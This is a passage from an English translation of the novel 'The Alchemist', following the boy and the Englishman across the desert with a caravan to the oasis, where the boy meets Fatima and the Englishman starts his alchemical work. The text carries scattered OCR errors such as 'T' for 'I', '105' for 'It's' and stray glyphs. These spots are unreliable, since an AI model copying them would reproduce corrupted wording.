their\nbelts and rifles slung on their\nshoulders. The Englishman had several\nsuitcases filled with books. There was a\nbabble of noise, and the leader had to\nrepeat himself several times for\neveryone to understand what he was\nsaying.\n\n\"There are a lot of different people\nhere, and each has his own God. But\nthe only God I serve is Allah, and in his\nname I swear that I will do everything\npossible once again to win out over the\ndesert. But I want each and every one\nof you to swear by the God you believe\nin that you will follow my orders no\nmatter what. In the desert,\ndisobedience means death.\"\n\nThere was a murmur from the crowd.\nEach was swearing quietly to his or her\nown God.\n\nThe boy swore to Jesus Christ. The\nEnglishman said nothing. And the\nmurmur lasted longer than a simple\nvow would have. The people were also\npraying to heaven for protection.\n\nA long note was sounded on a bugle,\nand everyone mounted up. The boy and\nthe Englishman had bought camels, and\nclimbed uncertainly onto their backs.\nThe boy felt sorry for the Englishman's\ncamel, loaded down as he was with the\ncases of books.\n\n۲\n\n\"There's no such thing as coincidence,\nsaid the Englishman, picking up the\nconversation where it had been\ninterrupted in the warehouse. \"I'm here\nbecause a friend of mine heard of an\nArab who...\"\n\nBut the caravan began to move, and it\nwas impossible to hear what the\nEnglishman was saying. The boy knew\nwhat he was about to describe, though:\nthe mysterious chain that links one\nthing to another, the same chain that\nhad caused him to become a shepherd,\nthat had caused his recurring dream,\nthat had brought him to a city near\nAfrica, to find a king, and to be robbed\nin order to meet a crystal merchant,\nand...\n\nThe closer one gets to realizing his\ndestiny, the more that destiny becomes\nhis true reason for being, thought the\nboy.\n\nThe caravan moved toward the east. It\ntraveled during the morning, halted\nwhen the sun was at its strongest, and\nresumed late in the afternoon. The boy\nspoke very little with the Englishman,\nwho spent most of his time with his\nbooks.\n\nThe boy observed in silence the\nprogress of the animals and people\nacross the desert.\n\nNow everything was quite different\nfrom how it was that day they had set\nout: then, there had been confusion and\nshouting, the cries of children and the\nwhinnying of animals, all mixed with\nthe nervous orders of the guides and\nthe merchants.\n\nBut, in the desert, there was only the\nsound of the eternal wind, and of the\nhoofbeats of the animals. Even the\nguides spoke very little to one another.\n\n\"I've crossed these sands many times,\"\nsaid one of the camel drivers one night.\n\"But the desert is so huge, and the\nhorizons so distant, that they make a\nperson feel small, and as if he should\nremain silent.\"\n\nThe boy understood intuitively what he\nmeant, even without ever having set\nfoot in the desert before. Whenever he\nsaw the sea, or a fire, he fell silent,\nimpressed by their elemental force.\n\nI've learned things from the sheep, and\nI've learned things from crystal, he\nthought. I can learn something from the\ndesert, too. It seems old and wise.\n\nThe wind never stopped, and the boy\nremembered the day he had sat at the\nfort in Tarifa with this same wind\nblowing in his face. It reminded him of\nthe wool from his sheep...\nhis sheep who were now seeking food\nand water in the fields of Andalusia, as\nthey always had.\n\n\"They're not my sheep anymore,\" he\nsaid to himself, without nostalgia.\n\"They must be used to their new\nshepherd, and have probably already\nforgotten me. That's good.\n\nCreatures like the sheep, that are used\nto traveling, know about moving on.”\n\nHe thought of the merchant's daughter,\nand was sure that she had probably\nmarried.\n\nPerhaps to a baker, or to another\nshepherd who could read and could tell\nher exciting stories—after all, he\nprobably wasn't the only one. But he\nwas excited at his intuitive\nunderstanding of the camel driver's\ncomment: maybe he was also learning\nthe universal language that deals with\nthe past and the present of all people.\n\"Hunches,\" his mother used to call\nthem. The boy was beginning to\nunderstand that intuition is really a\nsudden immersion of the soul into the\nuniversal current of life, where the\nhistories of all people are connected,\nand we are able to know everything,\nbecause it's all written there.\n\n\" Maktub,\" the boy said, remembering\nthe crystal merchant.\nThe desert was all sand in some\nstretches, and rocky in others. When\nthe caravan was blocked by a boulder,\nit had to go around it; if there was a\nlarge rocky area, they had to make a\nmajor detour. If the sand was too fine\nfor the animals' hooves, they sought a\nway where the sand was more\nsubstantial. In some places, the ground\nwas covered with the salt of dried-up\nlakes. The animals balked at such\nplaces, and the camel drivers were\nforced to dismount and unburden their\ncharges. The drivers carried the freight\nthemselves over such treacherous\nfooting, and then reloaded the camels.\nIf a guide were to fall ill or die, the\ncamel drivers would draw lots and\nappoint a new one.\n\nBut all this happened for one basic\nreason: no matter how many detours\nand adjustments it made, the caravan\nmoved toward the same compass point.\nOnce obstacles were overcome, it\nreturned to its course, sighting on a star\nthat indicated the location of the oasis.\nWhen the people saw that star shining\nin the morning sky, they knew they\nwere on the right course toward water,\npalm trees, shelter, and other people. It\nwas only the Englishman who was\nunaware of all this; he was, for the\nmost part, immersed in reading his\nbooks.\nThe boy, too, had his book, and he had\ntried to read it during the first few days\nof the journey. But he found it much\nmore interesting to observe the caravan\nand listen to the wind. As soon as he\nhad learned to know his camel better,\nand to establish a relationship with\nhim, he threw the book away. Although\nthe boy had developed a superstition\nthat each time he opened the book he\nwould learn something important, he\ndecided it was an unnecessary burden.\n\nHe became friendly with the camel\ndriver who traveled alongside him. At\nnight, as they sat around the fire, the\nboy related to the driver his adventures\nas a shepherd.\nDuring one of these conversations, the\ndriver told of his own life.\n\n\"T used to live near Ell Cairum,\" he\nsaid. \"I had my orchard, my children,\nand a life that would change not at all\nuntil I died. One year, when the crop\nwas the best ever, we all went to\nMecca, and I satisfied the only unmet\nobligation in my life. I could die\nhappily, and that made me feel good.\n\n\"One day, the earth began to tremble,\nand the Nile overflowed its banks. It\nwas something that I thought could\nhappen only to others, never to me. My\nneighbors feared they would lose all\ntheir olive trees in the flood, and my\nwife was afraid that we would lose our\nchildren. I thought that everything I\nowned would be destroyed.\n\n\"The land was ruined, and I had to find\nsome other way to earn a living. So\nnow I'm a camel driver. But that\ndisaster taught me to understand the\nword of Allah: people need not fear the\nunknown if they are capable of\nachieving what they need and want.\n\n\"We are afraid of losing what we have,\nwhether it's our life or our possessions\nand property. But this fear evaporates\nwhen we understand that our life\nstories and the history of the world\nwere written by the same hand.”\nSometimes, their caravan met with\nanother. One always had something\nthat the other needed—as if everything\nwere indeed written by one hand. As\nthey sat around the fire, the camel\ndrivers exchanged information about\nwindstorms, and told stories about the\ndesert.\n\nAt other times, mysterious, hooded\nmen would appear; they were Bedouins\nwho did surveillance along the caravan\nroute. They provided warnings about\nthieves and barbarian tribes. They\ncame in silence and departed the same\nway, dressed in black garments that\nshowed only their eyes. One night, a\ncamel driver came to the fire where the\nEnglishman and the boy were sitting.\n\"There are rumors of tribal wars,\" he\ntold them.\n\nThe three fell silent. The boy noted that\nthere was a sense of fear in the air,\neven though no one said anything.\nOnce again he was experiencing the\nlanguage without words... the\nuniversal language.\n\nThe Englishman asked if they were in\ndanger.\n\n\"Once you get into the desert, there's\nno going back,\" said the camel driver.\n\"And, when you can't go back, you\nhave to worry only about the best way\nof moving forward. The rest is up to\nAllah, including the danger.\"\n\nAnd he concluded by saying the\nmysterious word: \" Maktub.\"\n\n\"You should pay more attention to the\ncaravan,\" the boy said to the\nEnglishman, after the camel driver had\nleft. \"We make a lot of detours, but\nwe're always heading for the same\ndestination.\"\n\n\"And you ought to read more about the\nworld,\" answered the Englishman.\n\"Books are like caravans in that\nrespect.\"\n\nThe immense collection of people and\nanimals began to travel faster. The\ndays had always been silent, but now,\neven the nights—when the travelers\nwere accustomed to talking around the\nfires—had also become quiet. And, one\nday, the leader of the caravan made the\ndecision that the fires should no longer\nbe lighted, so as not to attract attention\nto the caravan.\n\nThe travelers adopted the practice of\narranging the animals in a circle at\nnight, sleeping together in the center as\nprotection against the nocturnal cold.\nAnd the leader posted armed sentinels\nat the fringes of the group.\n\nThe Englishman was unable to sleep\none night. He called to the boy, and\nthey took a walk along the dunes\nsurrounding the encampment. There\nwas a full moon, and the boy told the\nEnglishman the story of his life.\n\nThe Englishman was fascinated with\nthe part about the progress achieved at\nthe crystal shop after the boy began\nworking there.\n\n\"That's the principle that governs all\nthings,\" he said. \"In alchemy, it's called\nthe Soul of the World. When you want\nsomething with all your heart, that's\nwhen you are closest to the Soul of the\nWorld. It's always a positive force.\"\n\nHe also said that this was not just a\nhuman gift, that everything on the face\nof the earth had a soul, whether\nmineral, vegetable, or animal—or even\njust a simple thought.\n\n\"Everything on earth is being\ncontinuously transformed, because the\nearth is alive... and it has a soul. We\nare part of that soul, so we rarely\nrecognize that it is working for us. But\nin the crystal shop you probably\nrealized that even the glasses were\ncollaborating in your success.\"\n\nThe boy thought about that for a while\nas he looked at the moon and the\nbleached sands.\n\n\"T have watched the caravan as it\ncrossed the desert,\" he said. \"The\ncaravan and the desert speak the same\nlanguage, and it's for that reason that\nthe desert allows the crossing. It's\ngoing to test the caravan's every step to\nsee if it's in time, and, if it is, we will\nmake it to the oasis.\"\n\n\"If either of us had joined this caravan\nbased only on personal courage, but\nwithout understanding that language,\nthis journey would have been much\nmore difficult.”\n\nThey stood there looking at the moon.\n\n\"That's the magic of omens,\" said the\nboy. \"I've seen how the guides read the\nsigns of the desert, and how the soul of\nthe caravan speaks to the soul of the\ndesert.\"\n\nThe Englishman said, \"I'd better pay\nmore attention to the caravan.\"\n\n\"And I'd better read your books,\" said\nthe boy.\n\n水\n\nThey were strange books. They spoke\nabout mercury, salt, dragons, and\nkings, and he didn't understand any of\nit. But there was one idea that seemed\nto repeat itself throughout all the\nbooks: all things are the manifestation\nof one thing only.\n\nIn one of the books he learned that the\nmost important text in the literature of\nalchemy contained only a few lines,\nand had been inscribed on the surface\nof an emerald.\n\n\"105 the Emerald Tablet,\" said the\nEnglishman, proud that he might teach\nsomething to the boy.\n\n\"Well, then, why do we need all these\nbooks?\" the boy asked.\n\n\"So that we can understand those few\nlines,\" the Englishman answered,\nwithout appearing really to believe\nwhat he had said.\n\nThe book that most interested the boy\ntold the stories of the famous\nalchemists. They were men who had\ndedicated their entire lives to the\npurification of metals in their\nlaboratories; they believed that, if a\nmetal were heated for many years, it\nwould free itself of all its individual\nproperties, and what was left would be\nthe Soul of the World. This Soul of the\nWorld allowed them to understand\nanything on the face of the earth,\nbecause it was the language with which\nall things communicated. They called\nthat discovery the Master Work—it\nwas part liquid and part solid.\n\n\"Can't you just observe men and omens\nin order to understand the language?\"\nthe boy asked.\n\"You have a mania for simplifying\neverything,” answered the Englishman,\nirritated.\n\n\"Alchemy is a serious discipline. Every\nstep has to be followed exactly as it\nwas followed by the masters.\"\n\nThe boy learned that the liquid part of\nthe Master Work was called the Elixir\nof Life, and that it cured all illnesses; it\nalso kept the alchemist from growing\nold. And the solid part was called the\nPhilosopher's Stone.\n\n\"It's not easy to find the Philosopher's\nStone,\" said the Englishman. \"The\nalchemists spent years in their\nlaboratories, observing the fire that\npurified the metals. They spent so\nmuch time close to the fire that\ngradually they gave up the vanities of\nthe world. They discovered that the\npurification of the metals had led toa\npurification of themselves.\"\n\nThe boy thought about the crystal\nmerchant. He had said that it was a\ngood thing for the boy to clean the\ncrystal pieces, so that he could free\nhimself from negative thoughts. The\nboy was becoming more and more\nconvinced that alchemy could be\nlearned in one's daily life.\n\n\"Also,\" said the Englishman, \"the\nPhilosopher's Stone has a fascinating\nproperty. A small sliver of the stone\ncan transform large quantities of metal\ninto gold.\"\n\nHaving heard that, the boy became\neven more interested in alchemy. He\nthought that, with some patience, he'd\nbe able to transform everything into\ngold. He read the lives of the various\npeople who had succeeded in doing so:\nHelvétius, Elias, Fulcanelli, and Geber.\nThey were fascinating stories: each of\nthem lived out his destiny to the end.\nThey traveled, spoke with wise men,\nperformed miracles for the\nincredulous, and owned the\nPhilosopher's Stone and the Elixir of\nLife.\nBut when the boy wanted to learn how\nto achieve the Master Work, he became\ncompletely lost. There were just\ndrawings, coded instructions, and\nobscure texts.\n\n水\n\n\"Why do they make things so\ncomplicated?\" he asked the\nEnglishman one night. The boy had\nnoticed that the Englishman was\nirritable, and missed his books.\n\n\"So that those who have the\nresponsibility for understanding can\nunderstand,\" he said.\n\n\"Imagine if everyone went around\ntransforming lead into gold. Gold\nwould lose its value.\n\n\"It's only those who are persistent, and\nwilling to study things deeply, who\nachieve the Master Work. That's why\nI'm here in the middle of the desert. I'm\nseeking a true alchemist who will help\nme to decipher the codes.\"\n\n\"When were these books written?\" the\nboy asked.\n\n\"Many centuries ago.”\n\n\"They didn't have the printing press in\nthose days,\" the boy argued. \"There\nwas no way for everybody to know\nabout alchemy. Why did they use such\nstrange language, with so many\ndrawings?\"\n\nThe Englishman didn't answer him\ndirectly. He said that for the past few\ndays he had been paying attention to\nhow the caravan operated, but that he\nhadn't learned anything new. The only\nthing he had noticed was that talk of\nwar was becoming more and more\nfrequent.\n\n水\n\nThen one day the boy returned the\nbooks to the Englishman. “Did you\nlearn anything?\"\n\nthe Englishman asked, eager to hear\nwhat it might be. He needed someone\nto talk to so as to avoid thinking about\nthe possibility of war.\n\n\"T learned that the world has a soul, and\nthat whoever understands that soul can\nalso understand the language of things.\nI learned that many alchemists realized\ntheir destinies, and wound up\ndiscovering the Soul of the World, the\nPhilosopher's Stone, and the Elixir of\nLife.\n\n\"But, above all, I learned that these\nthings are all so simple that they could\nbe written on the surface of an\nemerald.\"\n\nThe Englishman was disappointed. The\nyears of research, the magic symbols,\nthe strange words and the laboratory\nequipment... none of this had made an\nimpression on the boy.\n\nHis soul must be too primitive to\nunderstand those things, he thought.\n\nHe took back his books and packed\nthem away again in their bags.\n\n\"Go back to watching the caravan,\" he\nsaid. \"That didn't teach me anything,\neither.\"\n\nThe boy went back to contemplating\nthe silence of the desert, and the sand\nraised by the animals. \"Everyone has\nhis or her own way of learning things,\"\nhe said to himself. \"His way isn't the\nsame as mine, nor mine as his. But\nwe're both in search of our destinies,\nand I respect him for that.\"\n\n水\n\nThe caravan began to travel day and\nnight. The hooded Bedouins reappeared\nmore and more frequently, and the\ncamel driver—who had become a good\nfriend of the boy's—\n\nexplained that the war between the\ntribes had already begun. The caravan\nwould be very lucky to reach the oasis.\n\nThe animals were exhausted, and the\nmen talked among themselves less and\nless. The silence was the worst aspect\nof the night, when the mere groan of a\ncamel—which before had been nothing\nbut the groan of a camel—now\nfrightened everyone, because it might\nsignal a raid.\n\nThe camel driver, though, seemed not\nto be very concerned with the threat of\nwar.\n\n\"I'm alive,\" he said to the boy, as they\nate a bunch of dates one night, with no\nfires and no moon. \"When I'm eating,\nthat's all I think about. If I'm on the\nmarch, I just concentrate on marching.\nIf I have to fight, it will be just as good\na day to die as any other.\n\"Because I don't live in either my past\nor my future. I'm interested only in the\npresent. If you can concentrate always\non the present, you'll be a happy man.\nYou'll see that there is life in the\ndesert, that there are stars in the\nheavens, and that tribesmen fight\nbecause they are part of the human\nrace. Life will be a party for you, a\ngrand festival, because life is the\nmoment we're living right now.\"\n\nTwo nights later, as he was getting\nready to bed down, the boy looked for\nthe star they followed every night. He\nthought that the horizon was a bit lower\nthan it had been, because he seemed to\nsee stars on the desert itself.\n\"It's the oasis,\" said the camel driver.\n\n\"Well, why don't we go there right\nnow?\" the boy asked.\n\n\"Because we have to sleep.\"\n\n水\n\nThe boy awoke as the sun rose. There,\nin front of him, where the small stars\nhad been the night before, was an\nendless row of date palms, stretching\nacross the entire desert.\n\n\"We've done it!\" said the Englishman,\nwho had also awakened early.\n\nBut the boy was quiet. He was at home\nwith the silence of the desert, and he\nwas content just to look at the trees. He\nstill had a long way to go to reach the\npyramids, and someday this morning\nwould just be a memory. But this was\nthe present moment—the party the\ncamel driver had mentioned—and he\nwanted to live it as he did the lessons\nof his past and his dreams of the future.\nAlthough the vision of the date palms\nwould someday be just a memory, right\nnow it signified shade, water, and a\nrefuge from the war. Yesterday, the\ncamel's groan signaled danger, and now\na row of date palms could herald a\nmiracle.\n\nThe world speaks many languages, the\nboy thought.\n\n水\n\nThe times rush past, and so do the\ncaravans, thought the alchemist, as he\nwatched the hundreds of people and\nanimals arriving at the oasis. People\nwere shouting at the new arrivals, dust\nobscured the desert sun, and the\nchildren of the oasis were bursting with\nexcitement at the arrival of the\nstrangers. The alchemist saw the tribal\nchiefs greet the leader of the caravan,\nand converse with him at length.\n\nBut none of that mattered to the\nalchemist. He had already seen many\npeople come and go, and the desert\nremained as it was. He had seen kings\nand beggars walking the desert sands.\nThe dunes were changed constantly by\nthe wind, yet these were the same sands\nhe had known since he was a child. He\nalways enjoyed seeing the happiness\nthat the travelers experienced when,\nafter weeks of yellow sand and blue\nsky, they first saw the green of the date\npalms. Maybe God created the desert\nso that man could appreciate the date\ntrees, he thought.\n\nHe decided to concentrate on more\npractical matters. He knew that in the\ncaravan there was a man to whom he\nwas to teach some of his secrets. The\nomens had told him so. He didn't know\nthe man yet, but his practiced eye\nwould recognize him when he\nappeared.\n\nHe hoped that it would be someone as\ncapable as his previous apprentice.\n\nI don't know why these things have to\nbe transmitted by word of mouth, he\nthought. It wasn't exactly that they\nwere secrets; God revealed his secrets\neasily to all his creatures.\n\nHe had only one explanation for this\nfact: things have to be transmitted this\nway because they were made up from\nthe pure life, and this kind of life\ncannot be captured in pictures or\nwords.\nBecause people become fascinated with\npictures and words, and wind up\nforgetting the Language of the World.\n\n水\n\nThe boy couldn't believe what he was\nseeing: the oasis, rather than being just\na well surrounded by a few palm trees\n—as he had seen once in a geography\nbook—was much larger than many\ntowns back in Spain. There were three\nhundred wells, fifty thousand date\ntrees, and innumerable colored tents\nspread among them.\n\n\"It looks like The Thousand and One\nNights,\" said the Englishman,\nimpatient to meet with the alchemist.\nThey were surrounded by children,\ncurious to look at the animals and\npeople that were arriving. The men of\nthe oasis wanted to know if they had\nseen any fighting, and the women\ncompeted with one another for access\nto the cloth and precious stones\nbrought by the merchants. The silence\nof the desert was a distant dream; the\ntravelers in the caravan were talking\nincessantly, laughing and shouting, as\nif they had emerged from the spiritual\nworld and found themselves once again\nin the world of people. They were\nrelieved and happy.\n\nThey had been taking careful\nprecautions in the desert, but the camel\ndriver explained to the boy that oases\nwere always considered to be neutral\nterritories, because the majority of the\ninhabitants were women and children.\nThere were oases throughout the desert,\nbut the tribesmen fought in the desert,\nleaving the oases as places of refuge.\n\nWith some difficulty, the leader of the\ncaravan brought all his people together\nand gave them his instructions. The\ngroup was to remain there at the oasis\nuntil the conflict between the tribes\nwas over. Since they were visitors, they\nwould have to share living space with\nthose who lived there, and would be\ngiven the best accommodations. That\nwas the law of hospitality. Then he\nasked that everyone, including his own\nsentinels, hand over their arms to the\nmen appointed by the tribal chieftains.\n\n\"Those are the rules of war,\" the leader\nexplained. \"The oases may not shelter\narmies or troops.”\n\nTo the boy's surprise, the Englishman\ntook a chrome-plated revolver out of\nhis bag and gave it to the men who\nwere collecting the arms.\n\n\"Why a revolver?\" he asked.\n\n\"It helped me to trust in people,\" the\nEnglishman answered.\n\nMeanwhile, the boy thought about his\ntreasure. The closer he got to the\nrealization of his dream, the more\ndifficult things became. It seemed as if\nwhat the old king had called\n\n\"beginner's luck\" were no longer\nfunctioning. In his pursuit of the\ndream, he was being constantly\nsubjected to tests of his persistence and\ncourage. So he could not be hasty, nor\nimpatient. If he pushed forward\nimpulsively, he would fail to see the\nsigns and omens left by God along his\npath.\n\nGod placed them along my path. He\nhad surprised himself with the thought.\nUntil then, he had considered the\nomens to be things of this world. Like\neating or sleeping, or like seeking love\nor finding a job. He had never thought\nof them in terms of a language used by\nGod to indicate what he should do.\n\n\"Don't be impatient,\" he repeated to\nhimself. \"It's like the camel driver said:\n‘Eat when it's time to eat. And move\nalong when it's time to move along.’ \"\n\nThat first day, everyone slept from\nexhaustion, including the Englishman.\nThe boy was assigned a place far from\nhis friend, in a tent with five other\nyoung men of about his age.\n\nThey were people of the desert, and\nclamored to hear his stories about the\ngreat Cities.\n\nThe boy told them about his life as a\nshepherd, and was about to tell them of\nhis experiences at the crystal shop\nwhen the Englishman came into the\ntent.\n\n\"I've been looking for you all\nmorning,\" he said, as he led the boy\noutside. \"I need you to help me find out\nwhere the alchemist lives.\"\n\nFirst, they tried to find him on their\nown. An alchemist would probably live\nin a manner that was different from\nthat of the rest of the people at the\noasis, and it was likely that in his tent\nan oven was continuously burning.\nThey searched everywhere, and found\nthat the oasis was much larger than\nthey could have imagined; there were\nhundreds of tents.\n\n\"We've wasted almost the entire day,\"\nsaid the Englishman, sitting down with\nthe boy near one of the wells.\n\n\"Maybe we'd better ask someone,\" the\nboy suggested.\n\nThe Englishman didn't want to tell\nothers about his reasons for being at\nthe oasis, and couldn't make up his\nmind. But, finally, he agreed that the\nboy, who spoke better Arabic than he,\nshould do so. The boy approached a\nwoman who had come to the well to fill\na goatskin with water.\n\n\"Good afternoon, ma'am. I'm trying to\nfind out where the alchemist lives here\nat the oasis.\"\n\nThe woman said she had never heard of\nsuch a person, and hurried away. But\nbefore she fled, she advised the boy\nthat he had better not try to converse\nwith women who were dressed in\nblack, because they were married\nwomen. He should respect tradition.\n\nThe Englishman was disappointed. It\nseemed he had made the long journey\nfor nothing.\n\nThe boy was also saddened; his friend\nwas in pursuit of his destiny. And,\nwhen someone was in such pursuit, the\nentire universe made an effort to help\nhim succeed—that's what the old king\nhad said. He couldn't have been wrong.\n\n\"T had never heard of alchemists\nbefore,\" the boy said. \"Maybe no one\nhere has, either.\"\n\nThe Englishman's eyes lit up. \"That's\nit! Maybe no one here knows what an\nalchemist is!\n\nFind out who it is who cures the\npeople's illnesses!\"\n\nSeveral women dressed in black came\nto the well for water, but the boy would\nspeak to none of them, despite the\nEnglishman's insistence. Then a man\napproached.\n\n\"Do you know someone here who cures\npeople's illnesses?” the boy asked.\n\n\"Allah cures our illnesses,\" said the\nman, clearly frightened of the\nstrangers. \"You're looking for witch\ndoctors.\" He spoke some verses from\nthe Koran, and moved on.\n\nAnother man appeared. He was older,\nand was carrying a small bucket. The\nboy repeated his question.\n\n\"Why do you want to find that sort of\nperson?\" the Arab asked.\n\"Because my friend here has traveled\nfor many months in order to meet with\nhim,” the boy said.\n\n\"Tf such a man is here at the oasis, he\nmust be the very powerful one,\" said\nthe old man after thinking for a few\nmoments. \"Not even the tribal\nchieftains are able to see him when\nthey want to. Only when he consents.\n\n\"Wait for the end of the war. Then\nleave with the caravan. Don't try to\nenter into the life of the oasis,\" he said,\nand walked away.\n\nBut the Englishman was exultant. They\nwere on the right track.\nFinally, a young woman approached\nwho was not dressed in black. She had\na vessel on her shoulder, and her head\nwas covered by a veil, but her face was\nuncovered. The boy approached her to\nask about the alchemist.\n\nAt that moment, it seemed to him that\ntime stood still, and the Soul of the\nWorld surged within him. When he\nlooked into her dark eyes, and saw that\nher lips were poised between a laugh\nand silence, he learned the most\nimportant part of the language that all\nthe world spoke—the language that\neveryone on earth was capable of\nunderstanding in their heart. It was\nlove. Something older than humanity,\nmore ancient than the desert.\n\nSomething that exerted the same force\nwhenever two pairs of eyes met, as had\ntheirs here at the well. She smiled, and\nthat was certainly an omen—the omen\nhe had been awaiting, without even\nknowing he was, for all his life. The\nomen he had sought to find with his\nsheep and in his books, in the crystals\nand in the silence of the desert.\n\nIt was the pure Language of the World.\nIt required no explanation, just as the\nuniverse needs none as it travels\nthrough endless time. What the boy felt\nat that moment was that he was in the\npresence of the only woman in his life,\nand that, with no need for words, she\nrecognized the same thing. He was\nmore certain of it than of anything in\nthe world.\n\nHe had been told by his parents and\ngrandparents that he must fall in love\nand really know a person before\nbecoming committed. But maybe\npeople who felt that way had never\nlearned the universal language.\nBecause, when you know that language,\nit's easy to understand that someone in\nthe world awaits you, whether it's in\nthe middle of the desert or in some\ngreat city. And when two such people\nencounter each other, and their eyes\nmeet, the past and the future become\nunimportant. There is only that\nmoment, and the incredible certainty\nthat everything under the sun has been\nwritten by one hand only. It is the hand\nthat evokes love, and creates a twin\nsoul for every person in the world.\nWithout such love, one's dreams would\nhave no meaning.\n\nMaktub, thought the boy.\n\nThe Englishman shook the boy: \"Come\non, ask her!\"\n\nThe boy stepped closer to the girl, and\nwhen she smiled, he did the same.\n\n\"What's your name?\" he asked.\n\"Fatima,\" the girl said, averting her\neyes.\n\n\"That's what some women in my\ncountry are called.\"\n\n\"It's the name of the Prophet's\ndaughter,\" Fatima said. \"The invaders\ncarried the name everywhere.\" The\nbeautiful girl spoke of the invaders\nwith pride.\n\nThe Englishman prodded him, and the\nboy asked her about the man who cured\npeople's illnesses.\n\n\"That's the man who knows all the\nsecrets of the world,\" she said. \"He\ncommunicates with the genies of the\ndesert.\"\n\nThe genies were the spirits of good and\nevil. And the girl pointed to the south,\nindicating that it was there the strange\nman lived. Then she filled her vessel\nwith water and left.\n\nThe Englishman vanished, too, gone to\nfind the alchemist. And the boy sat\nthere by the well for a long time,\nremembering that one day in Tarifa the\nlevanter had brought to him the\nperfume of that woman, and realizing\nthat he had loved her before he even\nknew she existed. He knew that his\nlove for her would enable him to\ndiscover every treasure in the world.\nThe next day, the boy returned to the\nwell, hoping to see the girl. To his\nsurprise, the Englishman was there,\nlooking out at the desert,\n\n\"I waited all afternoon and evening,\" he\nsaid. \"He appeared with the first stars\nof evening.\n\nI told him what I was seeking, and he\nasked me if I had ever transformed lead\ninto gold. I told him that was what I\nhad come here to learn.\n\n\"He told me I should try to do so.\nThat's all he said: 'Go and try.’ “\n\nThe boy didn't say anything. The poor\nEnglishman had traveled all this way,\nonly to be told that he should repeat\nwhat he had already done so many\ntimes.\n\n\"So, then try,\" he said to the\nEnglishman.\n\n\"That's what I'm going to do. I'm going\nto start now.\"\n\nAs the Englishman left, Fatima arrived\nand filled her vessel with water.\n\n\"I came to tell you just one thing,\" the\nboy said. \"I want you to be my wife. I\nlove you.”\n\nThe girl dropped the container, and the\nwater spilled.\n\"I'm going to wait here for you every\nday. I have crossed the desert in search\nof a treasure that is somewhere near the\nPyramids, and for me, the war seemed\na curse. But now it's a blessing,\nbecause it brought me to you.”\n\n\"The war is going to end someday,\" the\ngirl said.\n\nThe boy looked around him at the date\npalms. He reminded himself that he\nhad been a shepherd, and that he could\nbe a shepherd again. Fatima was more\nimportant than his treasure.\n\n\"The tribesmen are always in search of\ntreasure,\" the girl said, as if she had\nguessed what he was thinking. \"And the\nwomen of the desert are proud of their\ntribesmen.”\n\nShe refilled her vessel and left.\n\nThe boy went to the well every day to\nmeet with Fatima. He told her about his\nlife as a shepherd, about the king, and\nabout the crystal shop. They became\nfriends, and except for the fifteen\nminutes he spent with her, each day\nseemed that it would never pass. When\nhe had been at the oasis for almost a\nmonth, the leader of the caravan called\na meeting of all of the people traveling\nwith him.\n\n\"We don't know when the war will end,\n50 we can't continue our journey,\" he\nsaid. \"The battles may last for a long\ntime, perhaps even years. There are\npowerful forces on both sides, and the\nwar is important to both armies. It's not\na battle of good against evil. It's a war\nbetween forces that are fighting for the\nbalance of power, and, when that type\nof battle begins, it lasts longer than\nothers—because Allah is on both\nsides.\"\n\nThe people went back to where they\nwere living, and the boy went to meet\nwith Fatima that afternoon. He told her\nabout the morning's meeting. \"The day\nafter we met,\" Fatima said, \"you told\nme that you loved me. Then, you taught\nme something of the universal\nlanguage and the Soul of the World.\nBecause of that, I have become a part\nof you.”\n\nThe boy listened to the sound of her\nvoice, and thought it to be more\nbeautiful than the sound of the wind in\nthe date palms.\n\n\"I have been waiting for you here at\nthis oasis for a long time. I have\nforgotten about my past, about my\ntraditions, and the way in which men of\nthe desert expect women to behave.\nEver since I was a child, I have\ndreamed that the desert would bring me\na wonderful present. Now, my present\nhas arrived, and it's you.\"\nThe boy wanted to take her hand. But\nFatima's hands held to the handles of\nher jug.\n\n\"You have told me about your dreams,\nabout the old king and your treasure.\nAnd you've told me about omens. So\nnow, I fear nothing, because it was\nthose omens that brought you to me.\nAnd I am a part of your dream, a part\nof your destiny, as you call it.\n\n\"That's why I want you to continue\ntoward your goal. If you have to wait\nuntil the war is over, then wait. But if\nyou have to go before then, go on in\npursuit of your dream. The dunes are\nchanged by the wind, but the desert\nnever changes. That's the way it will be\nwith our love for each other.\n\n“ Maktub,\" she said. \"If I am really a\npart of your dream, you'll come back\none day.”\n\nThe boy was sad as he left her that day.\nHe thought of all the married shepherds\nhe had known. They had a difficult\ntime convincing their wives that they\nhad to go off into distant fields. Love\nrequired them to stay with the people\nthey loved.\n\nHe told Fatima that, at their next\nmeeting.\n\n\"The desert takes our men from us, and\nthey don't always return,\" she said.\n\"We know that, and we are used to it.\nThose who don't return become a part\nof the clouds, a part of the animals that\nhide in the ravines and of the water that\ncomes from the earth. They become a\npart of everything... they become the\nSoul of the World.\n\n\"Some do come back. And then the\nother women are happy because they\nbelieve that their men may one day\nreturn, as well. I used to look at those\nwomen and envy them their happiness.\nNow, I too will be one of the women\nwho wait.\n\n\"I'm a desert woman, and I'm proud of\nthat. I want my husband to wander as\nfree as the wind that shapes the dunes.\nAnd, if I have to, I will accept the fact\nthat he has become a part of the clouds,\nand the animals and the water of the\ndesert.\"\n\nThe boy went to look for the\nEnglishman. He wanted to tell him\nabout Fatima. He was surprised when\nhe saw that the Englishman had built\nhimself a furnace outside his tent. It\nwas a strange furnace, fueled by\nfirewood, with a transparent flask\nheating on top. As the Englishman\nstared out at the desert, his eyes\nseemed brighter than they had when he\nwas reading his books.\n\"This is the first phase of the job,\" he\nsaid. \"I have to separate out the sulfur.\nTo do that successfully, I must have no\nfear of failure. It was my fear of failure\nthat first kept me from attempting the\nMaster Work. Now, I'm beginning what\nI could have started ten years ago. But\nI'm happy at least that I didn't wait\ntwenty years.\"\n\nHe continued to feed the fire, and the\nboy stayed on until the desert turned\npink in the setting sun. He felt the urge\nto go out into the desert, to see if its\nsilence held the answers to his\nquestions.\n\nHe wandered for a while, keeping the\ndate palms of the oasis within sight. He\nlistened to the wind, and felt the stones\nbeneath his feet. Here and there, he\nfound a shell, and realized that the\ndesert, in remote times, had been a sea.\nHe sat on a stone, and allowed himself\nto become hypnotized by the horizon.\nHe tried to deal with the concept of\nlove as distinct from possession, and\ncouldn't separate them. But Fatima was\na woman of the desert, and, if anything\ncould help him to understand, it was\nthe desert.\n\nAs he sat there thinking, he sensed\nmovement above him. Looking up, he\nsaw a pair of hawks flying high in the\nsky.\nHe watched the hawks as they drifted\non the wind. Although their flight\nappeared to have no pattern, it made a\ncertain kind of sense to the boy. It was\njust that he couldn't grasp what it\nmeant. He 